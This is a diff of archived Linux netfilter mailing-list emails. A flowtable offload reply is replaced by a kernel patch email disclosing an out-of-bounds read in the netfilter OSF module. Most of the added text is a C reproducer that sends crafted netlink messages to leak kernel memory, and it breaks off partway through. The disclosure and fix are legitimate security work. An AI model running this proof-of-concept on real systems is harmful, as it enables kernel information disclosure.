@@ -2,120 +2,794 @@ Return-Path: <netfilter-devel-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id C190FCA0FE6
-	for <netfilter-devel@archiver.kernel.org>; Fri,  1 Sep 2023 12:49:04 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 09D72CA0FE6
+	for <netfilter-devel@archiver.kernel.org>; Fri,  1 Sep 2023 13:51:28 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S237195AbjIAMtF (ORCPT
+        id S237694AbjIANv3 (ORCPT
         <rfc822;netfilter-devel@archiver.kernel.org>);
-        Fri, 1 Sep 2023 08:49:05 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:42772 "EHLO
+        Fri, 1 Sep 2023 09:51:29 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:59188 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S235386AbjIAMtF (ORCPT
+        with ESMTP id S230361AbjIANv2 (ORCPT
         <rfc822;netfilter-devel@vger.kernel.org>);
-        Fri, 1 Sep 2023 08:49:05 -0400
-Received: from nbd.name (nbd.name [46.4.11.11])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 420E110D5;
-        Fri,  1 Sep 2023 05:48:34 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=nbd.name;
-        s=20160729; h=Content-Transfer-Encoding:Content-Type:In-Reply-To:From:
-        References:Cc:To:Subject:MIME-Version:Date:Message-ID:Sender:Reply-To:
-        Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
-        Resent-To:Resent-Cc:Resent-Message-ID:List-Id:List-Help:List-Unsubscribe:
-        List-Subscribe:List-Post:List-Owner:List-Archive;
-        bh=jEz8bAiOVlmzGdyxUIRR9AqE3yM7qGpXifKELMij1zU=; b=bPDfqYlRZsgayZhwrUmZHK4qqy
-        wOhu67FVYBlvtiJE1ufsAjbKHCH2otyMA6R2kwC7/wCmQGA0ThXopW0L1ZS8fgRXI2Wv/2jeoqmS0
-        gH3nnS20aMxbu9VqkWp2NbqRWyrEcc7BHyLu1yXiqeLrbRcJKeSYeK3wqsBz0eg3SIcs=;
-Received: from p4ff13705.dip0.t-ipconnect.de ([79.241.55.5] helo=nf.local)
-        by ds12 with esmtpsa  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
-        (Exim 4.94.2)
-        (envelope-from <nbd@nbd.name>)
-        id 1qc3YM-00Eyv9-Bw; Fri, 01 Sep 2023 14:47:10 +0200
-Message-ID: <61ea0316-2687-4928-a4d5-de20f3205c29@nbd.name>
-Date:   Fri, 1 Sep 2023 14:47:10 +0200
+        Fri, 1 Sep 2023 09:51:28 -0400
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 8B71CE4C
+        for <netfilter-devel@vger.kernel.org>; Fri,  1 Sep 2023 06:50:41 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+        s=mimecast20190719; t=1693576240;
+        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+         to:to:cc:cc:mime-version:mime-version:
+         content-transfer-encoding:content-transfer-encoding;
+        bh=u7VcT2FPTalt8+8h6ipOfmzWWxnZZu17XX1VuJymlhc=;
+        b=d5e+BrOuODS4tjOFIhFYWQbqRW1ex9sjWbiUvTNA1Nz1zdwxYFSWZbYr5imy2QHkCXMw6o
+        NK1SLtYklAPTxqgjCgtkW43c9xxnpfBTKGg32Ml5ML/vh+Btdy8821Wqs2Vi+/GSs34ShG
+        USNbUTdieNScvHPpqZUgqUTpsNDBv6c=
+Received: from mimecast-mx02.redhat.com (mx-ext.redhat.com [66.187.233.73])
+ by relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ us-mta-590-vZ_mQBeZMHaA2jzeX-6IrA-1; Fri, 01 Sep 2023 09:50:37 -0400
+X-MC-Unique: vZ_mQBeZMHaA2jzeX-6IrA-1
+Received: from smtp.corp.redhat.com (int-mx04.intmail.prod.int.rdu2.redhat.com [10.11.54.4])
+        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+        (No client certificate requested)
+        by mimecast-mx02.redhat.com (Postfix) with ESMTPS id 7E9AF380673A;
+        Fri,  1 Sep 2023 13:50:31 +0000 (UTC)
+Received: from fedora.redhat.com (unknown [10.22.17.59])
+        by smtp.corp.redhat.com (Postfix) with ESMTP id ED30E200A7CB;
+        Fri,  1 Sep 2023 13:50:23 +0000 (UTC)
+From:   Wander Lairson Costa <wander@redhat.com>
+To:     Pablo Neira Ayuso <pablo@netfilter.org>,
+        Jozsef Kadlecsik <kadlec@netfilter.org>,
+        Florian Westphal <fw@strlen.de>,
+        "David S. Miller" <davem@davemloft.net>,
+        Eric Dumazet <edumazet@google.com>,
+        Jakub Kicinski <kuba@kernel.org>,
+        Paolo Abeni <pabeni@redhat.com>,
+        Fernando Fernandez Mancera <ffmancera@riseup.net>,
+        netfilter-devel@vger.kernel.org (open list:NETFILTER),
+        coreteam@netfilter.org (open list:NETFILTER),
+        netdev@vger.kernel.org (open list:NETWORKING [GENERAL]),
+        linux-kernel@vger.kernel.org (open list)
+Cc:     Wander Lairson Costa <wander@redhat.com>,
+        Lucas Leong <wmliang@infosec.exchange>, stable@kernel.org
+Subject: [PATH nf v3] netfilter/osf: avoid OOB read
+Date:   Fri,  1 Sep 2023 10:50:20 -0300
+Message-ID: <20230901135021.30252-1-wander@redhat.com>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [RFC] netfilter: nf_tables: ignore -EOPNOTSUPP on flowtable
- device offload setup
-Content-Language: en-US
-To:     Pablo Neira Ayuso <pablo@netfilter.org>
-Cc:     netfilter-devel@vger.kernel.org, netdev@vger.kernel.org
-References: <20230831201420.63178-1-nbd@nbd.name> <ZPGjVl7jmLhMhgBP@calendula>
- <2575f329-7d95-46f8-ab88-2bcdf8b87d66@nbd.name> <ZPHZOKwPFflnqfFz@calendula>
-From:   Felix Fietkau <nbd@nbd.name>
-Autocrypt: addr=nbd@nbd.name; keydata=
- xsDiBEah5CcRBADIY7pu4LIv3jBlyQ/2u87iIZGe6f0f8pyB4UjzfJNXhJb8JylYYRzIOSxh
- ExKsdLCnJqsG1PY1mqTtoG8sONpwsHr2oJ4itjcGHfn5NJSUGTbtbbxLro13tHkGFCoCr4Z5
- Pv+XRgiANSpYlIigiMbOkide6wbggQK32tC20QxUIwCg4k6dtV/4kwEeiOUfErq00TVqIiEE
- AKcUi4taOuh/PQWx/Ujjl/P1LfJXqLKRPa8PwD4j2yjoc9l+7LptSxJThL9KSu6gtXQjcoR2
- vCK0OeYJhgO4kYMI78h1TSaxmtImEAnjFPYJYVsxrhay92jisYc7z5R/76AaELfF6RCjjGeP
- wdalulG+erWju710Bif7E1yjYVWeA/9Wd1lsOmx6uwwYgNqoFtcAunDaMKi9xVQW18FsUusM
- TdRvTZLBpoUAy+MajAL+R73TwLq3LnKpIcCwftyQXK5pEDKq57OhxJVv1Q8XkA9Dn1SBOjNB
- l25vJDFAT9ntp9THeDD2fv15yk4EKpWhu4H00/YX8KkhFsrtUs69+vZQwc0cRmVsaXggRmll
- dGthdSA8bmJkQG5iZC5uYW1lPsJgBBMRAgAgBQJGoeQnAhsjBgsJCAcDAgQVAggDBBYCAwEC
- HgECF4AACgkQ130UHQKnbvXsvgCgjsAIIOsY7xZ8VcSm7NABpi91yTMAniMMmH7FRenEAYMa
- VrwYTIThkTlQzsFNBEah5FQQCACMIep/hTzgPZ9HbCTKm9xN4bZX0JjrqjFem1Nxf3MBM5vN
- CYGBn8F4sGIzPmLhl4xFeq3k5irVg/YvxSDbQN6NJv8o+tP6zsMeWX2JjtV0P4aDIN1pK2/w
- VxcicArw0VYdv2ZCarccFBgH2a6GjswqlCqVM3gNIMI8ikzenKcso8YErGGiKYeMEZLwHaxE
- Y7mTPuOTrWL8uWWRL5mVjhZEVvDez6em/OYvzBwbkhImrryF29e3Po2cfY2n7EKjjr3/141K
- DHBBdgXlPNfDwROnA5ugjjEBjwkwBQqPpDA7AYPvpHh5vLbZnVGu5CwG7NAsrb2isRmjYoqk
- wu++3117AAMFB/9S0Sj7qFFQcD4laADVsabTpNNpaV4wAgVTRHKV/kC9luItzwDnUcsZUPdQ
- f3MueRJ3jIHU0UmRBG3uQftqbZJj3ikhnfvyLmkCNe+/hXhPu9sGvXyi2D4vszICvc1KL4RD
- aLSrOsROx22eZ26KqcW4ny7+va2FnvjsZgI8h4sDmaLzKczVRIiLITiMpLFEU/VoSv0m1F4B
- FtRgoiyjFzigWG0MsTdAN6FJzGh4mWWGIlE7o5JraNhnTd+yTUIPtw3ym6l8P+gbvfoZida0
- TspgwBWLnXQvP5EDvlZnNaKa/3oBes6z0QdaSOwZCRA3QSLHBwtgUsrT6RxRSweLrcabwkkE
- GBECAAkFAkah5FQCGwwACgkQ130UHQKnbvW2GgCeMncXpbbWNT2AtoAYICrKyX5R3iMAoMhw
- cL98efvrjdstUfTCP2pfetyN
-In-Reply-To: <ZPHZOKwPFflnqfFz@calendula>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
+X-Scanned-By: MIMEDefang 3.1 on 10.11.54.4
 Precedence: bulk
 List-ID: <netfilter-devel.vger.kernel.org>
 X-Mailing-List: netfilter-devel@vger.kernel.org
 
-On 01.09.23 14:29, Pablo Neira Ayuso wrote:
-> On Fri, Sep 01, 2023 at 12:30:37PM +0200, Felix Fietkau wrote:
->> On 01.09.23 10:39, Pablo Neira Ayuso wrote:
->> > Hi Felix,
->> > 
->> > On Thu, Aug 31, 2023 at 10:14:20PM +0200, Felix Fietkau wrote:
->> > > On many embedded devices, it is common to configure flowtable offloading for
->> > > a mix of different devices, some of which have hardware offload support and
->> > > some of which don't.
->> > > The current code limits the ability of user space to properly set up such a
->> > > configuration by only allowing adding devices with hardware offload support to
->> > > a offload-enabled flowtable.
->> > > Given that offload-enabled flowtables also imply fallback to pure software
->> > > offloading, this limitation makes little sense.
->> > > Fix it by not bailing out when the offload setup returns -EOPNOTSUPP
->> > 
->> > Would you send a v2 to untoggle the offload flag when listing the
->> > ruleset if EOPNOTSUPP is reported? Thus, the user knows that no
->> > hardware offload is being used.
->> 
->> Wouldn't that mess up further updates to the flowtable? From what I can
->> tell, when updating a flow table, changing its offload flag is not
->> supported.
-> 
-> The flag would be untoggled if hardware offload is not supported. What
-> problematic scenario are you having in mind that might break?
+The opt_num field is controlled by user mode and is not currently
+validated inside the kernel. An attacker can take advantage of this to
+trigger an OOB read and potentially leak information.
 
-The scenario I'm thinking about is this:
-Initially, the flowtable is created with a set of devices which don't 
-support offload.
-Afterwards, the flowtable gets updated with the intention of adding an 
-extra device which *does* support hw offload to the existing flowtable.
-If the flag was cleared after initially creating the table, I think the 
-update would fail. Or did I misread the code?
+Also add validation to genre, subtype and version fields.
 
-> In any case, there is a need to provide a way to tell the user if the
-> hardware offload is actually happening or not, if not what I suggest,
-> then propose a different way. But user really needs to know if it runs
-> software or hardware plane to debug issues.
+Reproducer:
 
-In my opinion, a single flag indication for the flow table is mostly 
-useless. Much more useful would be if you could query which of the 
-devices that were added to the flowtable support hw offload and which 
-ones don't. That requires some API changes though, and I don't think 
-that should be done in this patch.
+void install_filter_for_leak()
+{
+	char buf[0x1000] = {0};
+        struct iovec io = {
+		.iov_base = buf,
+		.iov_len = sizeof(buf)
+        };
+        struct msghdr msg = {0};
+        msg.msg_iov = &io;
+        msg.msg_iovlen = 1;
 
-- Felix
+	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
+
+	memset(buf, 0, sizeof(buf));
+	*(uint32_t*)(buf) = 0x14;
+	*(uint16_t*)(buf+4) = 0x10;
+	*(uint16_t*)(buf+6) = 1;
+	*(uint32_t*)(buf+8) = 0x63072925;
+	*(uint16_t*)(buf+0x12) = 0xa;
+	*(uint32_t*)(buf+0x14) = 0x20;
+	*(uint16_t*)(buf+0x18) = 0xa00;
+	*(uint16_t*)(buf+0x1a) = 0x5;
+	*(uint32_t*)(buf+0x1c) = 0x63072926;
+	*(uint8_t*)(buf+0x24) = 2;
+
+	*(uint16_t*)(buf+0x28) = 0xb;
+	*(uint16_t*)(buf+0x2a) = 1;
+	strcpy((void*)(buf+0x2c), "filter");
+
+	*(uint32_t*)(buf+0x34) = 0x14;
+	*(uint16_t*)(buf+0x38) = 0x11;
+	*(uint16_t*)(buf+0x3a) = 1;
+	*(uint32_t*)(buf+0x3c) = 0x63072927;
+	*(uint16_t*)(buf+0x46) = 0xa;
+	io.iov_len = 0x48;
+        sendmsg(fd, &msg, 0);
+
+	memset(buf, 0, sizeof(buf));
+	*(uint32_t*)(buf) = 0x14;
+	*(uint16_t*)(buf+4) = 0x10;
+	*(uint16_t*)(buf+6) = 1;
+	*(uint32_t*)(buf+8) = 0x63072925;
+	*(uint16_t*)(buf+0x12) = 0xa;
+	*(uint16_t*)(buf+0x14) = 0x40;
+	*(uint16_t*)(buf+0x18) = 0xa03;
+	*(uint16_t*)(buf+0x1a) = 0x5;
+	*(uint32_t*)(buf+0x1c) = 0x63072926;
+	*(uint32_t*)(buf+0x24) = 2;
+
+	*(uint16_t*)(buf+0x28) = 0xb;
+	*(uint16_t*)(buf+0x2a) = 1;
+	strcpy((void*)(buf+0x2c), "filter");
+	*(uint16_t*)(buf+0x34) = 0xa;
+	*(uint16_t*)(buf+0x36) = 3;
+	strcpy((void*)(buf+0x38), "input");
+	*(uint16_t*)(buf+0x40) = 0x14;
+	*(uint16_t*)(buf+0x42) = 0x8004;
+	*(uint16_t*)(buf+0x44) = 8;
+	*(uint16_t*)(buf+0x46) = 1;
+	*(uint32_t*)(buf+0x48) = 0x1000000;
+	*(uint16_t*)(buf+0x4c) = 8;
+	*(uint16_t*)(buf+0x4e) = 2;
+	*(uint32_t*)(buf+0x50) = 0;
+
+	*(uint32_t*)(buf+0x54) = 0x14;
+	*(uint16_t*)(buf+0x58) = 0x11;
+	*(uint16_t*)(buf+0x5a) = 1;
+	*(uint32_t*)(buf+0x5c) = 0x63072f50;
+	*(uint16_t*)(buf+0x66) = 0xa;
+	io.iov_len = 0x68;
+        sendmsg(fd, &msg, 0);
+
+	memset(buf, 0, sizeof(buf));
+	*(uint32_t*)(buf) = 0x14;
+	*(uint16_t*)(buf+4) = 0x10;
+	*(uint16_t*)(buf+6) = 1;
+	*(uint32_t*)(buf+8) = 0x63072925;
+	*(uint16_t*)(buf+0x12) = 0xa;
+	*(uint16_t*)(buf+0x14) = 0x40;
+	*(uint16_t*)(buf+0x18) = 0xa03;
+	*(uint16_t*)(buf+0x1a) = 5;
+	*(uint32_t*)(buf+0x1c) = 0x63072926;
+	*(uint32_t*)(buf+0x24) = 2;
+	*(uint16_t*)(buf+0x28) = 0xb;
+	*(uint16_t*)(buf+0x2a) = 1;
+	strcpy((void*)(buf+0x2c), "filter");
+	*(uint16_t*)(buf+0x34) = 0xb;
+	*(uint16_t*)(buf+0x36) = 3;
+	strcpy((void*)(buf+0x38), "output");
+	*(uint16_t*)(buf+0x40) = 0x14;
+	*(uint16_t*)(buf+0x42) = 0x8004;
+	*(uint16_t*)(buf+0x44) = 8;
+	*(uint16_t*)(buf+0x46) = 1;
+	*(uint32_t*)(buf+0x48) = 0x3000000;
+	*(uint16_t*)(buf+0x4c) = 8;
+	*(uint16_t*)(buf+0x4e) = 2;
+	*(uint32_t*)(buf+0x50) = 0;
+
+	*(uint32_t*)(buf+0x54) = 0x14;
+	*(uint16_t*)(buf+0x58) = 0x11;
+	*(uint16_t*)(buf+0x5a) = 1;
+	*(uint32_t*)(buf+0x5c) = 0x63072f50;
+	*(uint16_t*)(buf+0x66) = 0xa;
+	io.iov_len = 0x68;
+        sendmsg(fd, &msg, 0);
+
+	memset(buf, 0, sizeof(buf));
+	*(uint32_t*)(buf) = 0x14;
+	*(uint16_t*)(buf+4) = 0x10;
+	*(uint16_t*)(buf+6) = 1;
+	*(uint32_t*)(buf+8) = 0x63072925;
+	*(uint16_t*)(buf+0x12) = 0xa;
+	*(uint16_t*)(buf+0x14) = 0x2c;
+	*(uint16_t*)(buf+0x18) = 0xa03;
+	*(uint16_t*)(buf+0x1a) = 0x5;
+	*(uint32_t*)(buf+0x1c) = 0x63072926;
+	*(uint32_t*)(buf+0x24) = 2;
+	*(uint16_t*)(buf+0x28) = 0xb;
+	*(uint16_t*)(buf+0x2a) = 1;
+	strcpy((void*)(buf+0x2c), "filter");
+	*(uint16_t*)(buf+0x34) = 0x9;
+	*(uint16_t*)(buf+0x36) = 3;
+	strcpy((void*)(buf+0x38), "leak");
+
+	*(uint32_t*)(buf+0x40) = 0x14;
+	*(uint16_t*)(buf+0x44) = 0x11;
+	*(uint16_t*)(buf+0x46) = 1;
+	*(uint32_t*)(buf+0x48) = 0x63072f50;
+	*(uint16_t*)(buf+0x52) = 0xa;
+	io.iov_len = 0x54;
+        sendmsg(fd, &msg, 0);
+
+	char buf5[] = {
+		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+		0x74, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00, 0x1c, 0x01, 0x00, 0x00,
+		0x06, 0x0a, 0x05, 0x0c, 0x75, 0x41, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+		0x65, 0x72, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00,
+		0x69, 0x6e, 0x70, 0x75, 0x74, 0x00, 0x00, 0x00,
+		0xf0, 0x00, 0x04, 0x80, 0x24, 0x00, 0x01, 0x80,
+		0x09, 0x00, 0x01, 0x00, 0x6d, 0x65, 0x74, 0x61,
+		0x00, 0x50, 0x02, 0x00, 0x14, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+		0x06, 0xb0, 0x1b, 0x00, 0x34, 0x00, 0x01, 0x80,
+		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
+		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+		0x18, 0xd3, 0x01, 0x00, 0x3c, 0x00, 0x01, 0x80,
+		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
+		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x00, 0x00,
+		0x28, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x02, 0x80,
+		0x18, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0xff, 0xff, 0xff, 0xfd, 0x09, 0x00, 0x02, 0x00,
+		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
+		0x76, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00};
+	memset(buf, 0, sizeof(buf));
+	memcpy(buf, buf5, sizeof(buf5));
+	io.iov_len = 0x144;
+        sendmsg(fd, &msg, 0);
+
+	char buf6[] = {
+		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+		0xd9, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00, 0x54, 0x01, 0x00, 0x00,
+		0x06, 0x0a, 0x05, 0x0c, 0xda, 0x4e, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+		0x28, 0x01, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
+		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03,
+		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
+		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
+		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x05, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
+		0x00, 0x00, 0x00, 0x0d, 0x08, 0x00, 0x04, 0x00,
+		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
+		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x08,
+		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+		0x02, 0x00, 0x02, 0x80, 0x2c, 0x00, 0x01, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x63, 0x6d, 0x70, 0x00,
+		0x20, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+		0x00, 0x00, 0x00, 0x01, 0x0c, 0x00, 0x03, 0x80,
+		0x05, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00,
+		0x30, 0x00, 0x01, 0x80, 0x0e, 0x00, 0x01, 0x00,
+		0x69, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74,
+		0x65, 0x00, 0x02, 0x00, 0x1c, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x10, 0x00, 0x02, 0x80, 0x0c, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
+		0xdb, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00};
+	memset(buf, 0, sizeof(buf));
+	memcpy(buf, buf6, sizeof(buf6));
+	io.iov_len = 0x17c;
+        sendmsg(fd, &msg, 0);
+
+	char buf7[] = {
+		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+		0x7c, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00, 0x50, 0x00, 0x00, 0x00,
+		0x06, 0x0a, 0x05, 0x0c, 0x7d, 0x64, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+		0x24, 0x00, 0x04, 0x80, 0x20, 0x00, 0x01, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x6f, 0x73, 0x66, 0x00,
+		0x14, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x03, 0x00,
+		0x00, 0x00, 0x00, 0x01, 0x14, 0x00, 0x00, 0x00,
+		0x11, 0x00, 0x01, 0x00, 0x7e, 0x64, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
+	};
+	memset(buf, 0, sizeof(buf));
+	memcpy(buf, buf7, sizeof(buf7));
+	io.iov_len = 0x78;
+        sendmsg(fd, &msg, 0);
+
+	char buf8[] = {
+		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+		0xc9, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x0a, 0x00, 0x28, 0x01, 0x00, 0x00,
+		0x06, 0x0a, 0x05, 0x0c, 0xca, 0x64, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+		0xfc, 0x00, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
+		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x04,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x20,
+		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x10,
+		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
+		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
+		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
+		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x04, 0x00,
+		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
+		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
+		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
